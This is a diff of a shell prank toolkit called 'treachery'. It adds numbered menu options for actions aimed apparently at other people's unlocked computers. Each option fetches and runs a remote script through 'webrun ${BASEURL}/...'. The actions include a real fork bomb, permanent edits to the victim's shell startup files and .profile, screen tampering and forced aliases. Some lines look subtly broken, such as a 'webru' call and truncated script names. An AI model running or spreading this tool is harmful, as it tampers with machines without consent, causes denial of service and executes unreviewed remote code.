@@ -29,89 +29,89 @@ treachery(){
 	fi
 # the heart of the program, does all the heavy lifting
 	case "${INPUT}" in
-		"list"|"help"|"-h")
+		"1"|"list"|"help"|"-h")
 			echo "available options are as follows:
-		'list'|'help'|'-h' displays this list
-		'shortlist' displays all options without descriptions
-		'forked bom' summons a bunch of forks in terminals
-		'forkbomb' does an actual forkbomb, ${B}${U}do not use lightly${N}
-		'gif' gives you the choice between several different ascii gifs to display in terminal
-		'parrot' displays a disco parrot in the terminal
-		'boykisser' sets the users prompt to Boykisser with the caption 'You like leaving your screen unlocked, dont you' (21 lines tall)
+	1	'list'|'help'|'-h' displays this list
+	2	'shortlist' displays all options without descriptions
+	3	'forked bom' summons a bunch of forks in terminals
+	4	'forkbomb' does an actual forkbomb, ${B}${U}do not use lightly${N}
+	5	'gif' gives you the choice between several different ascii gifs to display in terminal
+	6	'parrot' displays a disco parrot in the terminal
+	7	'boykisser' sets the users prompt to Boykisser with the caption 'You like leaving your screen unlocked, dont you' (21 lines tall)
 			NB! is permanent, as it changes all* shell startup scripts, as well as .profile
-		'prompt' sets the users prompt to a much less intrusive version of the boykisser (1 line tall)
+	8	'prompt' sets the users prompt to a much less intrusive version of the boykisser (1 line tall)
 			NB! is permanent, as it changes all* shell startup scripts, as well as .profile
-		'brightness' sets the gamma of the screen
-		'tilt' tilt the screen by some factor
-		'rotate' rotates screen the 'regular' way
+	9	'brightness' sets the gamma of the screen
+	10	'tilt' tilt the screen by some factor
+	11	'rotate' rotates screen the 'regular' way
 			IE: how you would rotate your monitor
-		'zoom' zooms the screen in by a factor
-		'mirror' reflects the screen
-		'rickroll' opens a fullscreen firefox window of Rick Astley's hit single 'Never gonna give you up'
-		'alias' sets a bunch of aliases (to circumvent em, simply escape any of the characters in the alias)
-		'fish' fish
+	12	'zoom' zooms the screen in by a factor
+	13	'mirror' reflects the screen
+	14	'rickroll' opens a fullscreen firefox window of Rick Astley's hit single 'Never gonna give you up'
+	15	'alias' sets a bunch of aliases (to circumvent em, simply escape any of the characters in the alias)
+	16	'fish' fish
 			"
 			if [ ! "$@" = "" ]; then return; fi
 			treachery
 			;;
-		"shortlist"|"-l")
+		"2"|"shortlist"|"-l")
 			echo ${CHOICES}
 			if [ ! "$@" = "" ]; then return; fi
 			treachery
 			;;
-		"forked bom")
+		"3"|"forked bom")
 			echo "Forked bom chosen"
 			webrun ${BASEURL}/assorted/forked_bom/deploy_fork_bom.sh
 			;;
-		"forkbomb")
+		"4"|"forkbomb")
 			echo "Forkbomb chosen"
 			webru ${BASEURL}/assorted/forkbomb.sh
 			;;
-		"gif")
+		"5"|"gif")
 			echo "Gif chosen"
 			webrun ${BASEURL}/assorted/gif.sh
 			;;
-		"parrot")
+		"6"|"parrot")
 			echo "Parrot chosen"
 			webrun ${BASEURL}/assorted/parrot.sh
 			;;
-		"boykisser")
+		"7"|"boykisser")
 			echo "Boykisser chosen"
 			webrun ${BASEURL}/assorted/you_like_leaving_your_screen_unlocked_dont_you.sh
 			;;
-		"prompt")
+		"8"|"prompt")
 			echo "Prompt chosen"
 			webrun ${BASEURL}/assorted/prompt.sh
 			;;
-		"brightness")
+		"9"|"brightness")
 			echo "Brightness chosen"
 			webrun ${BASEURL}/assorted/brightne.sh
 			;;
-		"tilt")
+		"10"|"tilt")
 			echo "Tilt chosen"
 			webrun ${BASEURL}/assorted/rotate.sh
 			;;
-		"rotate")
+		"11"|"rotate")
 			echo "Rotate chosen"
 			webrun ${BASEURL}/assorted/screen.sh
 			;;
-		"zoom")
+		"12"|"zoom")
 			echo "Zoom chosen"
 			webrun ${BASEURL}/assorted/zoom.sh
 			;;
-		"mirror")
+		"13"|"mirror")
 			echo "Mirror chosen"
 			webrun ${BASEURL}/assorted/mirror.sh
 			;;
-		"rickroll")
+		"14"|"rickroll")
 			echo "Rickroll chosen"
 			webrun ${BASEURL}/assorted/rickroll.sh
 			;;
-		"alias")
+		"15"|"alias")
 			echo "Alias chosen"
 			webrun ${BASEURL}/assorted/aliases.sh
 			;;
-		"fish")
+		"16"|"fish")
 			echo "Fish"
 			webrun ${BASEURL}/assorted/fi.sh
 			;;
